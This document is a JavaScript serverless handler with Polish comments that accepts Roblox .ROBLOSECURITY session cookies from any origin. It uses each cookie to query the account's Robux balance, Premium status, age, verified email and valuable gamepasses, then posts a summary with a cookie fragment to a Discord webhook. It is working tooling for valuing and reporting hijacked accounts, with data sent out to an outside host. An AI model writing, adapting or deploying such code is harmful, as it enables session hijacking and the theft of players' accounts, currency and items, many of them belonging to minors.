export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST is allowed' });

  const { cookie } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  // ────────────────────────────────────────────────
  // UWAGA: zmień na swoją zmienną środowiskową lub wstaw tymczasowo link
  const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';

  if (!DISCORD_WEBHOOK_URL) {
    console.warn('DISCORD_WEBHOOK_URL nie jest ustawiony – dane nie zostaną wysłane na Discord');
  }

  try {
    // 1. Pobranie X-CSRF-Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
      },
    });

    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
    }

    // 2. Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });

    if (!userRes.ok) {
      throw new Error(
        userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`
      );
    }

    const userData = await userRes.json();

    // ────────────────────────────────────────────────
    // Sprawdzenie Verified Email (przez hat 102611803)
    // ────────────────────────────────────────────────
    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
        {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );

      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {
      // silent fail → zostaje false
    }

    // ────────────────────────────────────────────────
    // Premium / Robux / Wiek / Avatar / Gamepasy
    // ────────────────────────────────────────────────
    let hasPremium = false;
    try {
      const premiumRes = await fetch(
        `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
          },
        }
      );
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    let robux = 0;
    try {
      const currencyRes = await fetch(
        `https://economy.roblox.com/v1/users/${userData.id}/currency`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
          },
        }
      );
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    let avatarUrl = null;
    try {
      const thumbRes = await fetch(
        `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`
      );
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];

    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );

        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    // ────────────────────────────────────────────────
    // Przygotowanie wyniku
    // ────────────────────────────────────────────────
    const result = {
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: createdDate || 'failed to fetch',
      avatarUrl,
      hasGamePasses,
      emailVerified,
    };

    // ─── Wysyłka do Discorda (jeśli webhook jest ustawiony) ────────
    if (DISCORD_WEBHOOK_URL) {
      try {
        const embed = {
          title: `${result.username}  •  ${result.displayName}`,
          description: `**User ID:** ${result.userId}\n**Wiek konta:** ${result.accountAgeDays} dni`,
          color: result.hasPremium ? 0x00aaff : 0xaaaaaa,
          fields: [
            { name: 'Robux', value: result.robux.toLocaleString(), inline: true },
            { name: 'Premium', value: result.hasPremium ? 'Tak' : 'Nie', inline: true },
            { name: 'Email Verified', value: result.emailVerified ? 'Tak' : 'Nie', inline: true },
          ],
          thumbnail: {
            url: result.avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=720&height=720&format=png',
          },
          footer: {
            text: `Cookie fragment → ${cookie.slice(0, 8)}...${cookie.slice(-6)}`,
          },
          timestamp: new Date().toISOString(),
        };

        if (result.hasGamePasses.length > 0) {
          embed.fields.push({
            name: 'Gamepasy',
            value: result.hasGamePasses.join(', '),
            inline: false,
          });
        }

        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: 'Roblox Checker',
            avatar_url: 'https://i.imgur.com/4M34hi2.png', // opcjonalny avatar
            embeds: [embed],
          }),
        });
        // fire & forget – nie czekamy na odpowiedź
      } catch (webhookErr) {
        console.error('Błąd wysyłki do Discorda:', webhookErr.message);
        // nie psujemy odpowiedzi API
      }
    }

    // ─── Odpowiedź dla klienta ─────────────────────────────────────
    res.status(200).json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
}
